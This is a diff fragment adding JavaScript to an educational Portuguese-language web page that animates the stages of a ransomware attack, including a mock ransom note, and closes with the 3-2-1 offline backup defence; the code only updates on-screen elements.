+{lines:[3,4],hl:'hl-red',lbl:'FASE 1 — INFILTRAÇÃO',cls:'danger',txt:'Anexo malicioso, exploit ou senha fraca de RDP instala o dropper. O antivírus é desativado imediatamente. O backdoor garante acesso persistente.'},
+{lines:[6,7,8],hl:'hl-amber',lbl:'FASE 2 — PROPAGAÇÃO',cls:'warn',txt:'O malware mapeia a rede, identifica servidores de backup e move-se lateralmente usando credenciais comprometidas ou exploits de rede.'},
+{lines:[10,11,12],hl:'hl-red',lbl:'FASE 3 — DUPLA EXTORSÃO',cls:'danger',txt:'Antes de criptografar, <strong>envia os dados para o C2</strong>. Agora tem dois motivos para a vítima pagar: recuperar os dados E impedir a publicação de informações confidenciais.'},
+{lines:[14,15,16,17,18],hl:'hl-red',lbl:'FASE 4 — CRIPTOGRAFIA',cls:'danger',txt:'Cada arquivo é criptografado com AES-256. As chaves AES são criptografadas com RSA-4096. Sem a chave privada do atacante: matematicamente impossível descriptografar.'},
+{lines:[20,21,22],hl:'hl-red',lbl:'FASE 5 — EXTORSÃO',cls:'danger',txt:'README_DECRYPT.txt aparece em todas as pastas. Contador de 72h. Pagamento em Bitcoin. O site .onion lista vítimas que não pagaram com amostras dos dados roubados.'},
+{lines:[],hl:'',lbl:'DEFESA — REGRA 3-2-1',cls:'info',txt:'<strong>3</strong> cópias dos dados, em <strong>2</strong> mídias diferentes, sendo <strong>1</strong> offline (desconectada). Backup offline não pode ser criptografado. Teste a restauração regularmente.'},
+],
+_FILES:[{i:'📄',n:'relatorio.pdf'},{i:'📊',n:'vendas.xlsx'},{i:'🖼️',n:'logo.png'},{i:'📝',n:'contrato.doc'},{i:'💾',n:'backup.zip'},{i:'📧',n:'emails.pst'},{i:'🔑',n:'keys.txt'},{i:'📋',n:'dados.csv'},{i:'📁',n:'projetos'},{i:'🎥',n:'video.mp4'}],
+initV(){const F=this._FILES;document.getElementById('vis-area').innerHTML=`<span class="vis-lbl">// SISTEMA DA VÍTIMA //</span><div class="file-grid">${F.map((f,i)=>`<div class="fitem" id="rf${i}"><span class="fi-icon">${f.i}</span>${f.n}</div>`).join('')}</div><div class="rn" id="rn" style="display:none"></div><div class="exp-box" id="re"><span class="exp-lbl">AGUARDANDO</span>Clique em NEXT para iniciar.</div>`;},
+updV(s){
+const F=this._FILES;
+const ex=document.getElementById('re');if(ex){ex.className='exp-box'+(this.steps[s].cls?' '+this.steps[s].cls:'');ex.innerHTML=`<span class="exp-lbl">${this.steps[s].lbl}</span>${this.steps[s].txt}`;}
+if(tmr){clearInterval(tmr);tmr=null;}
+F.forEach((_,i)=>{const el=document.getElementById('rf'+i);if(el){el.className='fitem';el.style.opacity='1';el.innerHTML=`<span class="fi-icon">${F[i].i}</span>${F[i].n}`;}});
+const n=document.getElementById('rn');if(n){n.style.display='none';n.style.borderColor='';n.style.color='';n.style.background='';}
+if(s===3){[1,3,5,7].forEach(i=>{const el=document.getElementById('rf'+i);if(el)el.style.opacity='0.25';});}
+if(s===4){let idx=0;tmr=setInterval(()=>{if(idx>=F.length){clearInterval(tmr);return;}const el=document.getElementById('rf'+idx);if(el){el.className='fitem fenc';setTimeout(()=>{if(el){el.className='fitem flocked';el.style.opacity='1';el.innerHTML=`<span class="fi-icon">🔒</span>${F[idx].n}.locked`;}},500);}idx++;},200);}
+if(s===5&&n){n.style.display='block';n.innerHTML='💀 README_DECRYPT.txt<br><br>TODOS OS ARQUIVOS FORAM CRIPTOGRAFADOS<br><br>Pague 5 BTC (≈ R$ 2.500.000)<br>⏱️ Prazo: 72:00:00 — após o prazo: preço dobra e publicamos seus dados.';}
+if(s===6&&n){F.forEach((_,i)=>{const el=document.getElementById('rf'+i);if(el){el.className='fitem';el.style.opacity='1';el.innerHTML=`<span class="fi-icon">${F[i].i}</span>${F[i].n}`;}});n.style.display='block';n.style.borderColor='var(--green)';n.style.color='var(--green)';n.style.background='rgba(0,229,160,0.04)';n.innerHTML='✅ BACKUP OFFLINE RESTAURADO<br>Todos os arquivos recuperados. Resgate pago: R$ 0,00';}
+}}
+};
+
+function openAlgo(id){
+curAlgo=id;curStep=0;
+const a=ALGOS[id];
+document.getElementById('tb-title').textContent=a.title;
+document.getElementById('tb-tag').textContent=a.tag;document.getElementById('tb-tag').className='tb-tag '+a.tagCls;
+document.getElementById('pfname').textContent=a.fname;
+const ca=document.getElementById('code-area');
+ca.innerHTML=a.code.map((l,i)=>`<div class="code-line" id="cl${i}"><span class="ln">${String(i+1).padStart(2,'0')}</span><span>${l.t}</span></div>`).join('');
+a.initV();
+refreshUI();
+a.updV(0);
+document.getElementById('screen-menu').style.display='none';
+document.getElementById('screen-algo').style.display='flex';
+}
+
+function closeAlgo(){
+if(tmr){clearInterval(tmr);tmr=null;}
+document.getElementById('screen-algo').style.display='none';
+document.getElementById('screen-menu').style.display='flex';
+}
+
+function goStep(dir){
+const a=ALGOS[curAlgo];if(!a)return;
+const ns=curStep+dir;if(ns<0||ns>=a.steps.length)return;
+curStep=ns;if(tmr){clearInterval(tmr);tmr=null;}
+refreshUI();a.updV(curStep);
+}
+
+function doReset(){
+if(tmr){clearInterval(tmr);tmr=null;}
+curStep=0;const a=ALGOS[curAlgo];if(!a)return;
+a.initV();refreshUI();a.updV(0);
+}
+
+function refreshUI(){
+const a=ALGOS[curAlgo];if(!a)return;
+const tot=a.steps.length-1;
+document.getElementById('step-num').textContent=curStep+'/'+tot;
+document.getElementById('tb-steps').textContent='PASSO '+curStep+'/'+tot;
+document.getElementById('btn-prev').disabled=curStep===0;
+document.getElementById('btn-next').disabled=curStep===tot;
+const s=a.steps[curStep];
+a.code.forEach((_,i)=>{const el=document.getElementById('cl'+i);if(el)el.className='code-line'+(s.lines.includes(i+1)?' '+s.hl:'');});
+}
+
+window.openAlgo=openAlgo;window.closeAlgo=closeAlgo;window.goStep=goStep;window.doReset=doReset;
+</script>
+</body>
+</html>
